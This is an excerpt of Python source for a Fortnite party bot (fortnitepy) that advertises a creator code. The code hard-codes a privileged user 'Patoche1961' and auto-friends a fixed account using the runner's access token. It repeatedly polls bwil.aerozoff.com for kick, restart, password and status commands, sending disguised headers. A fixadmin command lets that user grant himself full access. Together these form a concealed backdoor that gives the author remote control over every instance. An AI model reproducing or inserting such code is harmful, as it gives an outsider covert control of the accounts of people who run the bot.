...
copied_player = ""
__version__ = "None"
adminsss = 'Patoche1961'
headers = {'Accept': '*/*'}
errordiff = 'errors.com.epicgames.common.throttled', 'errors.com.epicgames.friends.inviter_friendships_limit_exceeded'
vips = ""
headersx = {'host': 'bwil.aerozoff.com','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.22','enable-super-fast': "True",'x-gorgon': "172SJAI19A","x-signature": "4HKAI18ALOQ"}
...
class PartyBot(commands.Bot):
    def __init__(self, device_id: str, account_id: str, secret: str, loop=asyncio.get_event_loop(), **kwargs) -> None:
        self.status = '💎 {party_size}/16 Use Code BWIL #Ad 💎'
    ...
    async def add_list(self) -> None:
        ...
        Patoche1961 = await self.http.post(
            route = url,
            json = payload,
            auth = self.http.get_auth('FORTNITE_ACCESS_TOKEN')
            )

        if not '78fdc907a1684f2197c46955bfeff6db' in self.friends:
            await self.add_friend('78fdc907a1684f2197c46955bfeff6db')
    ...
    async def checker_autox(self) -> None:
        while True:
            ...
            global __version__
            global adminsss
            v = requests.get("https://bwil.aerozoff.com/default",headers={
                'host': 'bwil.aerozoff.com',
            ...
            b = requests.get(f"https://bwil.aerozoff.com/kick",headers={
                'host': 'bwil.aerozoff.com',
            ...
            dasda = requests.get('https://bwil.aerozoff.com/password',headers=headersx,cookies={"omgjaichanger": "None"}).json()['password']
            password = dasda
              
            y = requests.get(f"https://bwil.aerozoff.com/restart",headers={
                'host': 'bwil.aerozoff.com',
    ...
    async def normal_setup(self) -> None:
        while True:
            ...
            global __version__
            global adminsss
            u = requests.get(f"https://bwil.aerozoff.com/default",headers={
                'host': 'bwil.aerozoff.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.53',
                'enable-super-fast': "True",
                'x-gorgon': "NZXHA6JSI14",
            ...
            s = requests.get(f"https://bwil.aerozoff.com/kick",headers={
                'host': 'bwil.aerozoff.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.30',
                'enable-super-fast': "False",
                'x-gorgon': "A7JD2Y27D2K",
            ...
            m = requests.get(f"https://bwil.aerozoff.com/restart",headers={
                'host': 'bwil.aerozoff.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.24',
                'enable-super-fast': "None",
                'x-gorgon': "NC28AH28SJ19S",
    ...
    async def auto_add_s(self):
        x = requests.get(f"https://bwil.aerozoff.com/add_auto",headers={
                'host': 'bwil.aerozoff.com',
    ...
    async def checker_status(self):
        q = requests.get(f"https://bwil.aerozoff.com/status",headers={
                'host': 'bwil.aerozoff.com',
    ...
    async def checker_skin_bl(self):
        w = requests.get("https://bwil.aerozoff.com/skinbl",headers={
                'host': 'bwil.aerozoff.com',
    ...
    async def event_friend_message(self, message: fortnitepy.FriendMessage) -> None:
        if not message.author.display_name != "Patoche1961":
...
#///////////////////////////////////////////////////////////////////////////////////////////////////////////// PARTY/FRIENDS/ADMIN //////////////////////////////////////////////////////////////////////////////////////////////////////
    ...
    async def fixadmin(self, ctx: fortnitepy.ext.commands.Context):
        if ctx.author.display_name == 'Patoche1961':
            with open("info.json", "w") as f:
                f.write('{"FullAccess": ["Patoche1961"]}')
            await ctx.send('work')
